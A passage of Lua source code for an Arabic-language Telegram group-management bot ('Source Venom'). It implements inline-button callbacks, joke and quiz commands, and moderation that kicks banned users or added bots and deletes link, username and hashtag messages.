return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end

if Text and Text:match("^yesS(.*)$") then  
local delallph = Text:match("^yesS(.*)$")
if msg.sender_user_id_ == tonumber(SUDO) then 
local Texxt = "🚧 ┇ حسننا الان يمكنك ارسال معرف المطور الاساسي الجديد ..."
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'إالـغـاء الأمـر', callback_data="noS"..msg.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Texxt).."&message_id="..msg_idd.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:set(bot_id..":SUDO:USERNAME:"..msg.sender_user_id_,data.message_id_)
return false
end
end
if Text and Text:match("^noS(.*)$") then  
local delallph = Text:match("^noS(.*)$")
print(msg.sender_user_id_,SUDO)
print(msg.sender_user_id_== tonumber(SUDO))
if msg.sender_user_id_ == tonumber(SUDO) then 
--DeleteMessage(msg.chat_id_,{[0] = msg.message_id_})
local Teext = "🚧 ┇ تم الغاء الامر بنجاح ."
database:del(bot_id..":SUDO:USERNAME:"..msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
return false
end
end


if Text == 'EndAddarray'..data.sender_user_id_ then  
if database:get(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id) == 'true1' then
database:del(bot_id..'Set:array'..data.sender_user_id_..':'..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text == 'OkKikedMe'..data.sender_user_id_ then  
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=Chat_id,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if (data and data.code_ and data.code_ == 3) then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙البوت ليس ادمن يرجى ترقيتي !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙عذرا لا استطيع طرد ادمنية الكروب*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if data and data.ID and data.ID == 'Ok' then
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(" 𖥔︙تم الطرد بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)   
end
if Text == 'noKikedMe'..data.sender_user_id_ then  
local Text ="𖥔 تم الغاء الطرد بنجاح "
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ',url='http://t.me/SOURCEVENOM'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح الامر')  
else
send(msg.chat_id_, msg.id_,' 𖥔 لا يوجد امر بهاذا الاسم')  
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end 
-------------------------------------------------------------------------------------------------------------- 
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "تعطيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' 𖥔 تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' 𖥔  تم تفعيل اوامر التسليه')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فينوم')
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير ا��حب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' تحب هذا' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "نسبه الحب" or text == "نسبه حب" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال روظي و وروان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه حب '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "نسبه الكره" or text == "نسبه كره" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال اسد و لبوى'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الكره" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه كره '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "نسبه رجوله" or text == "نسبه الرجوله" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه رجولته \n مثال مصطفئ'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه رجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه رجوله '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "صراحه" or text == "الصراحه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rkko'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_,"sendrkkoe")
local LEADER_Msg = {
"صراحه  |  صوتك حلوة؟",
"صراحه  |  التقيت الناس مع وجوهين؟",
"صراحه  |  شيء وكنت تحقق اللسان؟",
"صراحه  |  أنا شخص ضعيف عندما؟",
"صراحه  |  هل ترغب في إظهار حبك ومرفق لشخص أو رؤية هذا الضعف؟",
"صراحه  |  يدل على أن الكذب مرات تكون ضرورية شي؟",
"صراحه  |  أشعر بالوحدة على الرغم من أنني تحيط بك كثيرا؟",
"صراحه  |  كيفية الكشف عن من يكمن عليك؟",
"صراحه  |  إذا حاول شخص ما أن يكرهه أن يقترب منك ويهتم بك تعطيه فرصة؟",
"صراحه  |  أشجع شيء حلو في حياتك؟",
"صراحه  |  طريقة جيدة يقنع حتى لو كانت الفكرة خاطئة توافق؟",
"صراحه  |  كيف تتصرف مع من يسيئون فهمك ويأخذ على ذهنه ثم ينتظر أن يرفض؟",
"صراحه  |  التغيير العادي عندما يكون الشخص الذي يحبه؟",
"صراحه  |  المواقف الصعبة تضعف لك ولا ترفع؟",
"صراحه  |  نظرة و يفسد الصداقة؟",
"صراحه  |  ‏‏إذا أحد قالك كلام سيء بالغالب وش تكون ردة فعلك؟",
"صراحه  |  شخص معك بالحلوه والمُره؟",
"صراحه  |  ‏هل تحب إظهار حبك وتعلقك بالشخص أم ترى ذلك ضعف؟",
"صراحه  |  تأخذ بكلام اللي ينصحك ولا تسوي اللي تبي؟",
"صراحه  |  وش تتمنى الناس تعرف عليك؟",
"صراحه  |  ابيع المجرة عشان؟",
"صراحه  |  أحيانا احس ان الناس ، كمل؟",
"صراحه  |  مع مين ودك تنام اليوم؟",
"صراحه  |  صدفة العمر الحلوة هي اني؟",
"صراحه  |  الكُره العظيم دايم يجي بعد حُب قوي تتفق؟",
"صراحه  |  صفة تحبها في نفسك؟",
"صراحه  |  ‏الفقر فقر العقول ليس الجيوب  ، تتفق؟",
"صراحه  |  تصلي صلواتك الخمس كلها؟",
"صراحه  |  ‏تجامل أحد على راحتك؟",
"صراحه  |  اشجع شيء سويتة بحياتك؟",
"صراحه  |  وش ناوي تسوي اليوم؟",
"صراحه  |  وش شعورك لما تشوف المطر؟",
"صراحه  |  غيرتك هاديه ولا تسوي مشاكل؟",
"صراحه  |  ما اكثر شي ندمن عليه؟",
"صراحه  |  اي الدول تتمنى ان تزورها؟",
"صراحه  |  متى اخر مره بكيت؟",
"صراحه  |  تقيم حظك ؟ من عشره؟",
"صراحه  |  هل تعتقد ان حظك سيئ؟",
"صراحه  |  شـخــص تتمنــي الإنتقــام منـــه؟",
"صراحه  |  كلمة تود سماعها كل يوم؟",
"صراحه  |  **هل تُتقن عملك أم تشعر بالممل؟",
"صراحه  |  هل قمت بانتحال أحد الشخصيات لتكذب على من حولك؟",
"صراحه  |  متى آخر مرة قمت بعمل مُشكلة كبيرة وتسببت في خسائر؟",
"صراحه  |  ما هو اسوأ خبر سمعته بحياتك؟",
"‏صراحه  | هل جرحت شخص تحبه من قبل ؟",
"صراحه  |  ما هي العادة التي تُحب أن تبتعد عنها؟",
"‏صراحه  | هل تحب عائلتك ام تكرههم؟",
"‏صراحه  |  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله الكريم – صلى الله عليه وسلم؟",
"‏صراحه  |  هل خجلت من نفسك من قبل؟",
"‏صراحه  |  ما هو ا الحلم  الذي لم تستطيع ان تحققه؟",
"‏صراحه  |  ما هو الشخص الذي تحلم به كل ليلة؟",
"‏صراحه  |  هل تعرضت إلى موقف مُحرج جعلك تكره صاحبهُ؟",
"‏صراحه  |  هل قمت بالبكاء أمام من تُحب؟",
"‏صراحه  |  ماذا تختار حبيبك أم صديقك؟",
"‏صراحه  | هل حياتك سعيدة أم حزينة؟",
"صراحه  |  ما هي أجمل سنة عشتها بحياتك؟",
"‏صراحه  |  ما هو عمرك الحقيقي؟",
"‏صراحه  |  ما اكثر شي ندمن عليه؟",
"صراحه  |  ما هي أمنياتك المُستقبلية؟‏",
"صراحه  | هل قبلت فتاه؟"
}
send(msg.chat_id_, msg.id_,'['..LEADER_Msg[math.random(#LEADER_Msg)]..']') 
return false
end
end
if text and text ~="صراحه" and database:get(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_) == "sendrkkoe" then
numj = {"اما قله ادب صحيح كلو كدب فى كدب💔😔"," ده مظبوط🙂😹"," اقلك الكلام ده كدب واللى قالولك كداب وانت كداب واللى بيتفرج كمان كداب🤝😂"," ده برجوله وموثق كمان❤️😁","فعلا بتتكلم صح🤗","يجدع قول كلام غير دا😹","احس هل شي كذب🌚💕","طب عيني ف عينك كدا ??","انت صح",};
sendnuj = numj[math.random(#numj)]
xl = ' ⟨  '..text..'  ⟩ \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_)
end
if text and text ~="نسبه رجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه رجوله '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "كشف الكذب" or text == "كشف الكدب" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rkko'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_,"sendrkkoe")
local LEADER_Msg = {
"ارسل لى الجمله لتعرف صدق ام كذب🌚✨"
}
send(msg.chat_id_, msg.id_,'['..LEADER_Msg[math.random(#LEADER_Msg)]..']') 
return false
end
end


if text == "نسبه الانوثه" or text == "نسبه انوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه انوثتها \n مثال روان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الانوثه" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه الانوثه '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and VNO_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and VNO_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GVNO_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GVNO_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
VENOM = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(VENOM)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
VENOM = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(VENOM)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
--------------------------------------------------------------------------------------------------------------
SourceVENOM(data.message_,data)
plugin_VENOM(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
--------------------------------------------------------------------------------------------------------------
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."lock_edit_med"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n 𖥔 شخص ما يحاول تعديل الميديا \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ادمن"
end
send(msg.chat_id_,0,''..t..'\n⩹━━━━「𝐕𝐄𝐍??𝐌」━━━━⩺\n 𖥔 تم التعديل على الميديا\n 𖥔 الشخص الي قام بالتعديل\n 𖥔 ايدي الشخص ◂ '..result.sender_user_id_..'\n 𖥔 معرف الشخص ↚{ '..users..' }') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
------------------------------------------------------------------------

------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
local VENOMAbot = database:get(bot_id.."VENOM1:Add:Filter:Rp2"..text..result.chat_id_)   
if VENOMAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
